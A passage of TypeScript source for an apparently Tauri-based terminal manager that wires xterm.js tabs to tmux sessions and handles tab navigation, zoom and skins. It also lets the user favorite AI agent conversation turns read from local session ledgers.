import "xp.css";
import "@xterm/xterm/css/xterm.css";
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";
import { invoke } from "@tauri-apps/api/core";
import { listen } from "@tauri-apps/api/event";
import { getCurrentWindow } from "@tauri-apps/api/window";
import { getCurrentWebview } from "@tauri-apps/api/webview";
import { WebviewWindow } from "@tauri-apps/api/webviewWindow";
import {
  PhysicalPosition,
  PhysicalSize,
  LogicalPosition,
  LogicalSize,
} from "@tauri-apps/api/dpi";
import { homeDir } from "@tauri-apps/api/path";
// CSS Anchor Positioning isn't in WebKit yet (Tauri = WKWebView); this shims
// `anchor-name`/`position-anchor`/`anchor()`/`position-area` so tooltips and
// menus can be authored in native CSS. No-ops where the browser supports it.
import anchorPolyfill from "@oddbird/css-anchor-positioning/fn";
import {
  store,
  type ActivitySource,
  type AppState,
  type CapturePerms,
  type CaptureStatus,
  type ConfigView,
  type DirListing,
  type Event,
  type AiMessage,
  type Fav,
  type FsEntry,
  type OpenTab,
  type Skin,
  type SprefaScopeItem,
  type SprefaScopeKind,
  type WorktreeRow,
  type WtAgent,
} from "./state";
import { registerPlugin, injectPanelHtml, buildActivityRail, allPanels } from "./plugin";
import {
  TmuxPanelV2,
  WorktreesPanelV2,
  FilesPanelV2,
  ActivityPanelV2,
  FavoritesPanelV2,
  setTmuxPanel,
  setWorktreesPanel,
  setFilesPanel,
  setActivityPanel,
  setFavoritesPanel,
  type TmuxRow,
  type WtTreeRow,
  type FsRow,
  type ActRow,
} from "./tablepanels";
import { renderTable, type SortState } from "./table";
import { fuzzyFilter } from "./fuzzy";
import { wireContextMenu, showContextMenu, type CtxItem } from "./ctxmenu";
import { installKeymap, runMatchingCommand, type Command } from "./keymap";
import {
  mountReactDock,
  togglePanel,
  isOpen,
  setDockHooks,
  onDockChange,
  addPreviewPanel,
  isPreviewOpen,
  addTermPanel,
  focusTermPanel,
  removeTermPanel,
  setTermTitle,
  customTermTitle,
  moveTermPanel,
  allPanelIds,
  activePanelId,
  activeGroupEl,
  focusPanelById,
  closeActivePanel,
} from "./reactdock";
import { marked } from "marked";
import DOMPurify from "dompurify";
import { codeToHtml } from "shiki";

type Session = {
  name: string;
  windows: number;
  attached: boolean;
  activity: number; // unix seconds of last activity (tmux #{session_activity})
  created: number; // unix seconds the session was created
  paths: string[]; // distinct pane cwds; mapped to worktrees in refreshSessions
  commands: string[]; // distinct foreground process per pane (claude, nvim, zsh…)
};

type Tab = {
  id: string;
  name: string;
  term: Terminal;
  fit: FitAddon;
  el: HTMLElement;
};

// Runtime registry of live terminals. These are resources, not serializable app
// state, so they stay out of the store; the active tab *id* lives in the store.
const tabs = new Map<string, Tab>();

// Open-tab ids in most-recently-focused order (front = newest). Drives the
// "send to" picker's ordering; updated whenever a terminal becomes active.
let tabRecency: string[] = [];
function touchTab(id: string) {
  tabRecency = [id, ...tabRecency.filter((x) => x !== id)];
}

const $ = <T extends HTMLElement>(s: string) => document.querySelector(s) as T;

const sessionId = (name: string) => `s:${name}`;
const activeId = () => store.get().active;
const setActive = (id: string | null) => store.set({ active: id });

// Persisted open-tab list (for reattach after reload). Keyed by tab name.
function recordTab(name: string, command: string | null, cwd: string | null) {
  const cur = store.get().openTabs;
  if (cur.some((t) => t.name === name)) return;
  store.set({ openTabs: [...cur, { name, command, cwd }] });
}
function forgetTab(id: string) {
  store.set({ openTabs: store.get().openTabs.filter((t) => sessionId(t.name) !== id) });
}

// Browser-like history of which session you went to and when. Logged into the
// unified activity store (source='session'), deduped on consecutive same-tab,
// suppressed during boot replay so restoring tabs doesn't spam the timeline.
let replaying = false;
let lastVisited: string | null = null;
function logTabVisit(name: string) {
  if (replaying || name === lastVisited) return;
  lastVisited = name;
  invoke("activity_log", {
    source: "session",
    kind: "focus",
    title: name,
    text: `went to ${name}`,
  }).catch(() => {});
}

// xterm palettes per skin. XP = classic console; P5 = blood-red on black;
// AC3 = phosphor-green garage readout with an orange cursor.
const THEMES: Record<Skin, { background: string; foreground: string; cursor: string }> = {
  xp: { background: "#000000", foreground: "#c0c0c0", cursor: "#ffffff" },
  p5: { background: "#0a0000", foreground: "#ff2b2b", cursor: "#ff2b2b" },
  ac3: { background: "#050805", foreground: "#b8e08a", cursor: "#ff8c1a" },
};

// Skin cycle order for the toolbar toggle (XP -> P5 -> AC3 -> XP).
const SKIN_CYCLE: Skin[] = ["xp", "p5", "ac3"];
const nextSkin = (s: Skin): Skin =>
  SKIN_CYCLE[(SKIN_CYCLE.indexOf(s) + 1) % SKIN_CYCLE.length];

// Quick-start sessions launch their agent the first time the tmux session is created.
const QUICK_CMD: Record<string, string> = {
  claude: "claude",
  opencode: "opencode",
};

// ---- tab commands (driven by the central keymap) ----
// Visual tab nav walks EVERY panel across ALL panes (dockview order), not just
// the active group, so cmd+1..9 / next / prev cross panes and reach tool panels
// sharing the bar (tmux v2, worktrees v2). Focusing a panel in another group
// activates that group (setActive). Falls back to terminal open-order before the
// dock reports groups. focusPanelById/activePanelId are generic over panel type.
const visualTabIds = () => {
  const ids = allPanelIds();
  return ids.length ? ids : [...tabs.keys()];
};

// Move focus by ±1 through the visible tabs, wrapping around.
function focusTabByOffset(delta: number) {
  const ids = visualTabIds();
  if (ids.length < 2) return;
  const cur = activePanelId() ?? activeId();
  const i = cur ? ids.indexOf(cur) : -1;
  const next = ids[((i < 0 ? 0 : i) + delta + ids.length) % ids.length];
  focusPanelById(next);
}

// Go to the Nth tab (1-based). 9 always jumps to the last, browser-style.
function focusTabN(n: number) {
  const ids = visualTabIds();
  if (!ids.length) return;
  const idx = n >= 9 ? ids.length - 1 : n - 1;
  if (ids[idx]) focusPanelById(ids[idx]);
}

// Close the focused tab (cmd/ctrl+W). Closes dockview's ACTIVE panel, not the
// store.active terminal — those diverge once focus lands on a non-terminal panel
// (tmux v2, …), which made cmd+W close a stale sibling. Terminal teardown +
// closed-tab capture still run via onTermClosed.
function closeActiveTab() {
  closeActivePanel();
}

// Session name behind the active tab id (strips the "s:" prefix), or "".
function activeTabName(): string {
  const id = activeId();
  return id ? id.slice(sessionId("").length) : "";
}

// Transient in-pane toast for one-shot feedback (favorite saved, nothing to
// favorite, …). Mounts top-center INSIDE the active tab's group (not a global
// fixed corner) and slides in; reuses one node, re-parented to whichever pane is
// active so it always shows over the tab the gesture came from.
let toastEl: HTMLElement | null = null;
let toastTimer: number | null = null;
function flashStatus(msg: string) {
  if (!toastEl) {
    toastEl = document.createElement("div");
    toastEl.className = "app-toast";
  }
  const host = activeGroupEl() ?? document.getElementById("dock") ?? document.body;
  if (toastEl.parentElement !== host) host.appendChild(toastEl);
  toastEl.textContent = msg;
  // restart the enter animation even if the node is reused mid-show
  toastEl.classList.remove("on");
  void toastEl.offsetWidth;
  toastEl.classList.add("on");
  if (toastTimer !== null) clearTimeout(toastTimer);
  toastTimer = window.setTimeout(() => toastEl?.classList.remove("on"), 1800);
}

// ---- favorited AI turns (ledger.rs reads, favorites.db persists) ----
// cwd + launch command of the active tab. cwd keys the harness session lookup
// and the claude ledger path; the command's first token hints the agent (but we
// don't require it — a folder can have a claude/opencode session even if the tab
// is a plain shell the user ran the agent inside).
function activeTabMeta(): { cwd: string; command: string | null } | null {
  const id = activeId();
  return id ? tabMetaById(id) : null;
}

// Resolve the candidate harness sessions for a cwd by probing BOTH editors'
// on-disk stores (harness_session). The tab's launch command, when it names an
// agent, just orders the probe so the declared agent wins ties.
async function tabSessions(
  cwd: string,
  command: string | null,
): Promise<{ editor: "claude" | "opencode"; sessionId: string }[]> {
  const bin = (command ?? "").trim().split(/\s+/)[0]?.split("/").pop();
  const order: ("claude" | "opencode")[] =
    bin === "opencode" ? ["opencode", "claude"] : ["claude", "opencode"];
  const out: { editor: "claude" | "opencode"; sessionId: string }[] = [];
  for (const editor of order) {
    const sid = await invoke<string | null>("harness_session", { tool: editor, cwd }).catch(
      () => null,
    );
    if (sid) out.push({ editor, sessionId: sid });
  }
  return out;
}

// Per-(editor,session) ledger cache + the per-tab merged turn list the terminal
// right-click matches against. Warmed on tab activation so the context menu can
// stay synchronous.
const ledgerCache = new Map<string, AiMessage[]>();
const tabTurns = new Map<string, AiMessage[]>();
async function turnsFor(
  editor: "claude" | "opencode",
  sessionId: string,
  cwd: string,
): Promise<AiMessage[]> {
  const key = `${editor}:${sessionId}`;
  const hit = ledgerCache.get(key);
  if (hit) return hit;
  const msgs = await invoke<AiMessage[]>("read_ai_messages", {
    editor,
    sessionId,
    cwd,
    afterSeq: null,
  }).catch(() => [] as AiMessage[]);
  ledgerCache.set(key, msgs);
  return msgs;
}
// Load (or refresh) the turns behind a terminal tab into tabTurns. Re-reads the
// latest session each call (drops the cache for it) so a live conversation's new
// turns become matchable.
async function warmTurns(id: string) {
  const meta = tabMetaById(id);
  if (!meta) return;
  const sessions = await tabSessions(meta.cwd, meta.command);
  const all: AiMessage[] = [];
  for (const s of sessions) {
    ledgerCache.delete(`${s.editor}:${s.sessionId}`); // pick up new turns
    all.push(...(await turnsFor(s.editor, s.sessionId, meta.cwd)));
  }
  tabTurns.set(id, all);
}
// The tab's working dir. The recorded launch cwd is often null/HOME (the user
// cd's then runs the agent inside a shell), so prefer the LIVE tmux pane cwd
// (store.sessions[].paths) — that's where claude/opencode actually keyed their
// session — and fall back to the launch cwd.
function tabMetaById(id: string): { cwd: string; command: string | null } | null {
  const t = tabs.get(id);
  if (!t) return null;
  const rec = store.get().openTabs.find((o) => o.name === t.name);
  const live = store.get().sessions.find((s) => s.name === t.name);
  const cwd = live?.paths?.[0] || rec?.cwd || null;
  return cwd ? { cwd, command: rec?.command ?? null } : null;
}

// --- on-screen turn identification (the alt-screen blocks text selection, so we
// read the xterm buffer directly). Each harness marks turn boundaries visually:
// claude prefixes assistant turns with a ⏺ bullet; opencode paints message blocks
// with a non-default background. We find the block under the pointer via those
// signatures, then match its rendered text to a ledger turn. ---
// Turn-boundary glyphs: claude's ⏺ assistant bullet + the › chevron on human
// turns; opencode delimits with a non-default bg run instead.
const TURN_BULLETS = new Set(["⏺", "●", "◉", "⏵", "•", "◆", "›", "❯", "»", "▶", "🭬"]);
let lastCtxY = 0; // viewport Y of the last right-click, for terminal turn-identify

function rowText(line: import("@xterm/xterm").IBufferLine): string {
  return line.translateToString(true);
}
// First visible glyph + whether any cell has a non-default bg (opencode block).
function rowSignature(line: import("@xterm/xterm").IBufferLine, cols: number) {
  let firstGlyph = "";
  let hasBg = false;
  for (let x = 0; x < cols; x++) {
    const cell = line.getCell(x);
    if (!cell) continue;
    if (!hasBg && !cell.isBgDefault()) hasBg = true;
    const ch = cell.getChars();
    if (!firstGlyph && ch && ch.trim()) firstGlyph = ch;
    if (firstGlyph && hasBg) break;
  }
  return { isBullet: TURN_BULLETS.has(firstGlyph), hasBg };
}

// The rendered text block under clientY: bounded by claude bullets if present,
// else by an opencode bg-color run, else a ±pad line window.
function blockTextAt(id: string, clientY: number): string {
  const t = tabs.get(id);
  if (!t) return "";
  const screen = (t.el.querySelector(".xterm-screen") as HTMLElement | null) ?? t.el;
  const rect = screen.getBoundingClientRect();
  const cellH = rect.height / t.term.rows || 1;
  let vr = Math.floor((clientY - rect.top) / cellH);
  vr = Math.max(0, Math.min(t.term.rows - 1, vr));
  const buf = t.term.buffer.active;
  const top = buf.viewportY;
  const rows: { text: string; isBullet: boolean; hasBg: boolean }[] = [];
  for (let r = 0; r < t.term.rows; r++) {
    const line = buf.getLine(top + r);
    if (!line) {
      rows.push({ text: "", isBullet: false, hasBg: false });
      continue;
    }
    const sig = rowSignature(line, t.term.cols);
    rows.push({ text: rowText(line), isBullet: sig.isBullet, hasBg: sig.hasBg });
  }
  const hasBullets = rows.some((r) => r.isBullet);
  let lo = vr;
  let hi = vr;
  if (hasBullets) {
    while (lo > 0 && !rows[lo].isBullet) lo--;
    while (hi < rows.length - 1 && !rows[hi + 1].isBullet) hi++;
  } else if (rows[vr].hasBg) {
    while (lo > 0 && rows[lo - 1].hasBg) lo--;
    while (hi < rows.length - 1 && rows[hi + 1].hasBg) hi++;
  } else {
    lo = Math.max(0, vr - 4);
    hi = Math.min(rows.length - 1, vr + 4);
  }
  return rows
    .slice(lo, hi + 1)
    .map((r) => r.text)
    .join("\n")
    .trim();
}

// The whitespace-delimited token under a pointer cell, for ⌘-click open. Maps
// clientX/Y → buffer cell, reads that row's text, expands around the column over
// non-space chars, then trims wrapping brackets/quotes + trailing sentence
// punctuation (keeping a `:line:col` suffix, whose digits aren't stripped).
function tokenAt(id: string, clientX: number, clientY: number): string {
  const t = tabs.get(id);
  if (!t) return "";
  const screen = (t.el.querySelector(".xterm-screen") as HTMLElement | null) ?? t.el;
  const rect = screen.getBoundingClientRect();
  const cellH = rect.height / t.term.rows || 1;
  const cellW = rect.width / t.term.cols || 1;
  let row = Math.floor((clientY - rect.top) / cellH);
  let col = Math.floor((clientX - rect.left) / cellW);
  row = Math.max(0, Math.min(t.term.rows - 1, row));
  col = Math.max(0, Math.min(t.term.cols - 1, col));
  const buf = t.term.buffer.active;
  const line = buf.getLine(buf.viewportY + row);
  if (!line) return "";
  const text = line.translateToString(true);
  if (col >= text.length || /\s/.test(text[col] ?? "")) return "";
  let lo = col;
  let hi = col;
  while (lo > 0 && !/\s/.test(text[lo - 1])) lo--;
  while (hi < text.length - 1 && !/\s/.test(text[hi + 1])) hi++;
  return text
    .slice(lo, hi + 1)
    .replace(/^[('"<[{]+/, "")
    .replace(/[.,;:)\]}>'"]+$/, "");
}

// Cheap front gate so a ⌘-click on a plain word does nothing (no window hide):
// a URL scheme, a www. host, or a token bearing a slash/dot/tilde path marker.
function looksOpenable(tok: string): boolean {
  return /:\/\//.test(tok) || /^www\./.test(tok) || /[/~]/.test(tok) || /\.[a-z0-9]/i.test(tok);
}

const normText = (s: string) => s.toLowerCase().replace(/\s+/g, " ").trim();

// The search query for a right-click: the live selection if there is one, else
// the rendered block under the pointer (surrounding lines, signature-bounded).
function ledgerQuery(id: string, clientY: number): string {
  const sel = tabs.get(id)?.term.getSelection()?.trim();
  if (sel && sel.length >= 3) return sel;
  return blockTextAt(id, clientY);
}

// ripgrep/ILIKE over the tab's ledger turns: a turn matches when ALL query words
// appear in its text (case-insensitive, %word% each). Ranked: an exact contiguous
// phrase hit first, then word-hit count, then recency. Returns the top matches.
function searchTurns(turns: AiMessage[], query: string, limit = 6): AiMessage[] {
  const q = normText(query);
  const words = [...new Set(q.split(" ").filter((w) => w.length >= 2))];
  if (!words.length) return [];
  const phrase = words.join(" ");
  const scored: { t: AiMessage; score: number }[] = [];
  for (const t of turns) {
    const text = normText(t.text);
    let hit = 0;
    for (const w of words) if (text.includes(w)) hit++;
    if (hit < words.length) continue; // ILIKE AND: every term must appear
    scored.push({ t, score: (text.includes(phrase) ? 1000 : 0) + hit });
  }
  scored.sort((a, b) => b.score - a.score || b.t.seq - a.t.seq);
  return scored.slice(0, limit).map((s) => s.t);
}

const relTime = (ts: number): string => {
  if (!ts) return "";
  const m = Math.floor((Date.now() - ts) / 60000);
  if (m < 1) return "just now";
  if (m < 60) return `${m}m ago`;
  const h = Math.floor(m / 60);
  return h < 24 ? `${h}h ago` : `${Math.floor(h / 24)}d ago`;
};

// Is this turn already in favorites? (identity = editor + session + message id)
function isTurnFav(turn: AiMessage): boolean {
  return store.get().aiFavs.some(
    (f) =>
      f.editor === turn.editor &&
      f.session_id === turn.session_id &&
      f.message_id === turn.id,
  );
}

// Snapshot one identified turn into favorites.db. No navigation — the toast
// confirms and the ★ rail badge ticks up; open the panel yourself when you want.
async function favoriteTurn(turn: AiMessage, cwd: string) {
  const favs = await invoke<Fav[]>("fav_add", { msg: turn, cwd }).catch((e) => {
    console.error("fav_add", e);
    return null;
  });
  if (favs) {
    store.set({ aiFavs: favs });
    flashStatus(`★ favorited ${turn.role} turn`);
  }
}

async function unfavoriteTurn(turn: AiMessage) {
  const favs = await invoke<Fav[]>("fav_remove", {
    editor: turn.editor,
    sessionId: turn.session_id,
    messageId: turn.id,
  }).catch((e) => {
    console.error("fav_remove", e);
    return null;
  });
  if (favs) {
    store.set({ aiFavs: favs });
    flashStatus("unfavorited turn");
  }
}

// "locate" a favorite: open the saved turn's full text in a split-right preview
// tab (keyed by the turn identity). We already hold the text, so this works for
// both editors and never reads the (multi-MB) jsonl. The locator line shows the
// on-disk address (claude path#line / opencode msg id).
function locateFav(f: Fav) {
  const key = `fav:${f.editor}:${f.session_id}:${f.message_id}`;
  let inst = previewInsts.get(key);
  if (!inst) {
    const el = document.createElement("div");
    el.className = "fs-preview";
    inst = { el };
    previewInsts.set(key, inst);
  }
  const title = `★ ${f.editor} · ${f.role}`;
  inst.el.innerHTML =
    `<div class="fs-preview-meta">${escapeHtml(title)}<br><span>${escapeHtml(f.locator)}</span></div>` +
    `<pre class="code-plain">${escapeHtml(f.text)}</pre>`;
  addPreviewPanel(key, title, inst.el, "right");
}

// cmd+shift+s: favorite the active tab's latest turn (no pointer needed). Probes
// the cwd for a session, so it works even when the tab is a plain shell.
async function favoriteCurrentTurn() {
  const meta = activeTabMeta();
  if (!meta) {
    flashStatus("no folder for this tab");
    return;
  }
  const sessions = await tabSessions(meta.cwd, meta.command);
  if (!sessions.length) {
    flashStatus("no AI session for this folder");
    return;
  }
  const s = sessions[0];
  const msg = await invoke<AiMessage | null>("latest_ai_message", {
    editor: s.editor,
    sessionId: s.sessionId,
    cwd: meta.cwd,
  }).catch(() => null);
  if (!msg) {
    flashStatus("no turn found yet");
    return;
  }
  await favoriteTurn(msg, meta.cwd);
}

function registerFavoritesBridge() {
  setFavoritesPanel({
    favs: () => store.get().aiFavs,
    onShow: () => refreshFavorites(),
    copy: (f) => {
      navigator.clipboard.writeText(f.text).catch(() => {});
      flashStatus("turn copied");
    },
    locate: (f) => locateFav(f),
    remove: (f) =>
      invoke<Fav[]>("fav_remove", {
        editor: f.editor,
        sessionId: f.session_id,
        messageId: f.message_id,
      })
        .then((favs) => store.set({ aiFavs: favs }))
        .catch((e) => console.error("fav_remove", e)),
  });
}

function refreshFavorites() {
  invoke<Fav[]>("fav_list")
    .then((favs) => store.set({ aiFavs: favs }))
    .catch(() => {});
}

// Passive count badge on the ★ favorites rail button, so a saved turn registers
// in the UI without navigating there. Subscribed to aiFavs.
function updateFavBadge() {
  const btn = document.getElementById("favorites-toggle");
  if (!btn) return;
  let badge = btn.querySelector(".rail-badge") as HTMLElement | null;
  const n = store.get().aiFavs.length;
  if (!n) {
    badge?.remove();
    return;
  }
  if (!badge) {
    badge = document.createElement("span");
    badge.className = "rail-badge";
    btn.appendChild(badge);
  }
  badge.textContent = n > 99 ? "99+" : String(n);
}

// ---- pinned terminal tabs (persisted by session name) ----
// Visual is a 📌 prefix on the dockview tab title, pushed via reactdock's
// setTermTitle (a public API) so we don't have to touch reactdock's renderer.
const isPinnedTab = (name: string) => store.get().pinnedTabs.includes(name);
// Base = the durable rename override (store.tabTitles) if set, else the session
// name; the pin prefix rides on top so pin + rename compose.
const tabTitle = (name: string) => {
  const base = customTermTitle(sessionId(name)) ?? name;
  return isPinnedTab(name) ? `📌 ${base}` : base;
};
function applyTabTitle(name: string) {
  setTermTitle(sessionId(name), tabTitle(name));
}
function togglePinTab(name: string) {
  if (!name) return;
  const cur = store.get().pinnedTabs;
  store.set({
    pinnedTabs: cur.includes(name)
      ? cur.filter((n) => n !== name)
      : [...cur, name],
  });
  applyTabTitle(name);
  reflowPinnedTabs();
}
function togglePinActiveTab() {
  togglePinTab(activeTabName());
}

// Stack of recently closed tabs for reopen (⌘⇧T). In-memory only. A tmux session
// survives a tab close, so reopen reattaches by name and the agent is still
// alive; the stored command/cwd only matter if the session was actually killed.
const closedTabs: OpenTab[] = [];
function reopenLastTab() {
  const last = closedTabs.pop();
  if (!last) return;
  // ⌘⇧T is the "bring back what I just closed" gesture — so if we exited an agent
  // here, resume its conversation (cwd-keyed killed record) instead of replaying
  // the stale original command. Consumed on use. "new · X" never comes through
  // here, so a fresh session stays fresh.
  const killed = last.cwd ? store.get().resumeTabs[last.cwd] : undefined;
  let command = last.command;
  if (killed) {
    command = resumeLaunch(killed.editor, killed.sessionId);
    const rest = { ...store.get().resumeTabs };
    delete rest[last.cwd!];
    store.set({ resumeTabs: rest });
    console.log("[resume] ⌘⇧T", last.name, "->", command);
  }
  openTab(last.name, { command, cwd: last.cwd });
}

// Float pinned tabs to the left of the bar, in pinnedTabs order. Each open
// pinned tab is moved to its slot (0,1,2,…); processing in order lets earlier
// pins settle first so the final left-to-right matches the list.
function reflowPinnedTabs() {
  let i = 0;
  for (const name of store.get().pinnedTabs) {
    if (tabs.has(sessionId(name))) moveTermPanel(sessionId(name), i++);
  }
}

// Open a new tmux session at the active tab's cwd (cmd/ctrl+T). The session is
// named after that directory; falls back to a plain "shell" at HOME when there's
// no active terminal to read a cwd from.
function openTabAtPwd() {
  const name = activeTabName();
  const sess = name ? store.get().sessions.find((s) => s.name === name) : undefined;
  const cwd = (sess?.paths ?? [])[0] ?? null;
  const taken = new Set<string>([
    ...store.get().sessions.map((s) => s.name),
    ...[...tabs.values()].map((t) => t.name),
  ]);
  const base = cwd ? tmuxName(baseName(cwd)) : "shell";
  let fresh = base;
  let n = 2;
  while (taken.has(fresh)) fresh = `${base}-${n++}`;
  openTab(fresh, { cwd });
  refreshSessions();
}

// ---- webview zoom (chrome: rail + toolbars + non-terminal panels) ----
const ZOOM_MIN = 0.5;
const ZOOM_MAX = 2.0;
const ZOOM_STEP = 0.1;
function applyZoom() {
  getCurrentWebview().setZoom(store.get().zoom).catch(console.error);
}
function nudgeZoom(delta: number) {
  const z = Math.min(ZOOM_MAX, Math.max(ZOOM_MIN, +(store.get().zoom + delta).toFixed(2)));
  store.set({ zoom: z });
  applyZoom();
}
function resetZoom() {
  store.set({ zoom: 1 });
  applyZoom();
}

// ---- per-terminal zoom (font size, persisted per tab id) ----
// The terminal that currently holds keyboard focus. ⌘+/-/0 zoom THAT terminal's
// font when set; otherwise they fall back to the webview/chrome zoom above. Set
// on the xterm textarea focus/blur in openTab.
let focusedTermId: string | null = null;
const TERM_FONT_DEFAULT = 13;
const TERM_FONT_MIN = 6;
const TERM_FONT_MAX = 40;
const termFontSize = (id: string) => store.get().tabZoom[id] ?? TERM_FONT_DEFAULT;
function applyTermFontSize(id: string, px: number) {
  const t = tabs.get(id);
  if (!t) return;
  t.term.options.fontSize = px;
  t.fit.fit(); // reflow cols/rows + tell the pty via onResize
}
function setTermFontSize(id: string, px: number) {
  const clamped = Math.min(TERM_FONT_MAX, Math.max(TERM_FONT_MIN, px));
  store.set({ tabZoom: { ...store.get().tabZoom, [id]: clamped } });
  applyTermFontSize(id, clamped);
}
// Route a zoom gesture: a focused terminal zooms its own font; else the chrome.
function zoomGesture(delta: number) {
  if (focusedTermId && tabs.has(focusedTermId)) {
    setTermFontSize(focusedTermId, termFontSize(focusedTermId) + (delta > 0 ? 1 : -1));
  } else {
    nudgeZoom(delta);
  }
}
function zoomResetGesture() {
  if (focusedTermId && tabs.has(focusedTermId)) {
    setTermFontSize(focusedTermId, TERM_FONT_DEFAULT);
  } else {
    resetZoom();
  }
}

const TAB_COMMANDS: Command[] = [
  { id: "tab.next", keys: ["$mod+Shift+BracketRight", "Control+Tab"], run: () => focusTabByOffset(1) },
  { id: "tab.prev", keys: ["$mod+Shift+BracketLeft", "Control+Shift+Tab"], run: () => focusTabByOffset(-1) },
  { id: "tab.close", keys: ["$mod+w"], run: closeActiveTab },
  { id: "tab.open", keys: ["$mod+t"], run: openTabAtPwd },
  { id: "tab.reopen", keys: ["$mod+Shift+t"], run: reopenLastTab },
  { id: "tab.pin", keys: ["$mod+Shift+p"], run: togglePinActiveTab },
  // Favorite the active tab's latest AI turn (claude/opencode) into favorites.db.
  { id: "ai.favTurn", keys: ["$mod+Shift+s"], run: () => void favoriteCurrentTurn() },
  // Reload the webview — recover from a crashed React render without restarting
  // the app (tmux sessions outlive the reload, so nothing is lost).
  { id: "app.reload", keys: ["$mod+r"], run: () => location.reload() },
  // Zoom: cmd +/-/0. A focused terminal zooms its own font (persisted per tab);
  // otherwise the webview chrome (rail + toolbars) zooms (persisted, 0.5–2.0).
  { id: "app.zoomIn", keys: ["$mod+Equal", "$mod+Shift+Equal"], run: () => zoomGesture(ZOOM_STEP) },
  { id: "app.zoomOut", keys: ["$mod+Minus"], run: () => zoomGesture(-ZOOM_STEP) },
  { id: "app.zoomReset", keys: ["$mod+Digit0"], run: zoomResetGesture },
  // cmd/ctrl+1..9 jump to a tab (9 = last).
  ...Array.from({ length: 9 }, (_, i) => ({
    id: `tab.goto${i + 1}`,
    keys: [`$mod+${i + 1}`],
    run: () => focusTabN(i + 1),
  })),
];

// opts let a Space override the agent command and launch cwd; plain sessions
// fall back to QUICK_CMD and the backend default (HOME).
function openTab(name: string, opts: { command?: string | null; cwd?: string | null } = {}) {
  const id = sessionId(name);
  if (tabs.has(id)) {
    activate(id);
    return;
  }

  // openTab is mechanical: it opens exactly the command it's handed. Resume is a
  // deliberate gesture (⌘⇧T reopen, or the worktree "auto-resume latest" toggle),
  // resolved by the caller — NOT here — so "new · X" stays a fresh session.

  // Visible confirmation that a reopen actually resumed (vs started fresh) —
  // matches either reopen path since both bake the --resume/--session flag in.
  const rm = opts.command?.match(/\s--(?:resume|session)\s+(\S+)/);
  if (rm) {
    console.log("[resume]", name, opts.command);
    flashStatus(`↻ resuming ${rm[1].slice(0, 8)}`);
  }

  const el = document.createElement("div");
  el.className = "term-host";
  // Live in the pool (in-document, so xterm can measure) until dockview adopts
  // it into the terminal's panel.
  document.getElementById("panel-pool")!.appendChild(el);

  const term = new Terminal({
    // Menlo renders the body text; the rest are per-glyph fallbacks for
    // powerline separators + Nerd Font icons (PUA codepoints Menlo lacks). The
    // "Nerd Font" names win if installed; "for Powerline" is the guaranteed
    // separator fallback already on disk. Install full icons with:
    //   brew install --cask font-hack-nerd-font
    fontFamily:
      'Menlo, "Hack Nerd Font Mono", "MesloLGS NF", "DejaVu Sans Mono for Powerline", monospace',
    fontSize: termFontSize(id), // persisted per-tab zoom (default 13)
    cursorBlink: true,
    allowProposedApi: true,
    theme: THEMES[store.get().skin],
  });
  const fit = new FitAddon();
  term.loadAddon(fit);
  term.open(el);

  tabs.set(id, { id, name, term, fit, el });

  // ⌘-click a path or URL to open it (iTerm2 semantic-history). Capture phase +
  // stop so xterm never starts a selection. Only handles tokens that look like a
  // path/url; anything else falls through to the focus handler below.
  el.addEventListener(
    "mousedown",
    (e) => {
      if (!e.metaKey || e.button !== 0) return;
      const tok = tokenAt(id, e.clientX, e.clientY);
      if (!tok || !looksOpenable(tok)) return;
      e.preventDefault();
      e.stopPropagation();
      const cwd = tabMetaById(id)?.cwd ?? "";
      invoke<string>("open_target", { target: tok, cwd })
        .then((kind) =>
          invoke("activity_log", {
            source: "session",
            kind: "open",
            title: tok,
            text: `${kind}: ${tok}`,
          }).catch(() => {}),
        )
        .catch(() => {}); // unresolved path/url: ignore silently
    },
    { capture: true },
  );

  // Click anywhere in the host (incl. padding around the xterm) focuses the
  // terminal, so keyboard + scroll work without hunting for the text area.
  el.addEventListener("mousedown", () => term.focus());

  // Shift+wheel scrolls the tmux history even when a full-screen TUI
  // (opencode/claude) has grabbed the mouse so a plain wheel goes to the app
  // (the "scroll randomly doesn't work" case). xterm has no real scrollback here
  // — tmux owns the history — so this drives tmux copy-mode in the backend.
  // Capture phase + stop so the app never sees it; plain wheel is untouched.
  el.addEventListener(
    "wheel",
    (e) => {
      if (!e.shiftKey) return;
      e.preventDefault();
      e.stopPropagation();
      const lines = Math.max(1, Math.round(Math.abs(e.deltaY) / 24));
      invoke("scroll_session", { name, up: e.deltaY < 0, lines }).catch(console.error);
    },
    { capture: true, passive: false },
  );

  // Track which terminal owns keyboard focus so ⌘+/-/0 zoom the right one.
  term.textarea?.addEventListener("focus", () => {
    focusedTermId = id;
  });
  term.textarea?.addEventListener("blur", () => {
    if (focusedTermId === id) focusedTermId = null;
  });

  term.onData((data) => invoke("write_pty", { id, data }).catch(console.error));
  term.onResize(({ cols, rows }) =>
    invoke("resize_pty", { id, cols, rows }).catch(console.error),
  );

  // iTerm2-style word/line editing. xterm doesn't emit these by default on mac,
  // so we intercept and write the readline/emacs control sequences the shell
  // (and claude/opencode) understand. Returning false stops xterm's own handling
  // (e.g. Alt+b inserting "∫").
  term.attachCustomKeyEventHandler((e) => {
    if (e.type !== "keydown") return true;
    // App command? Run it, swallow the key (no pty write), and stop it bubbling
    // to the window keymap listener so it doesn't fire twice.
    if (runMatchingCommand(e)) {
      e.stopPropagation();
      return false;
    }
    const send = (data: string) => {
      invoke("write_pty", { id, data }).catch(console.error);
      return false;
    };
    const only = (a: boolean, b: boolean, c: boolean) => a && !b && !c;
    // Shift+Enter: insert a newline instead of submitting. At the byte level
    // Shift+Enter == Enter (both \r); the only way claude/opencode can tell them
    // apart is the Kitty keyboard protocol's CSI-u encoding: ESC [ 13 ; 2 u
    // (13 = Enter, 2 = Shift). tmux forwards this only with `extended-keys on`
    // (see enable_extended_keys in pty.rs).
    if (e.key === "Enter" && e.shiftKey && !e.metaKey && !e.ctrlKey && !e.altKey)
      return send("\x1b[13;2u");
    if (only(e.altKey, e.metaKey, e.ctrlKey)) {
      if (e.key === "ArrowLeft") return send("\x1bb"); // word back
      if (e.key === "ArrowRight") return send("\x1bf"); // word forward
      if (e.key === "Backspace") return send("\x1b\x7f"); // delete word back
    }
    if (only(e.metaKey, e.altKey, e.ctrlKey)) {
      // Cmd+C: xterm paints its selection in its own layer (not a DOM selection)
      // so copy only when there IS a selection, else fall through. Paste is left
      // to xterm's native handler (its textarea paste event) — handling it here
      // too double-pastes.
      if (e.key === "c" && term.hasSelection()) {
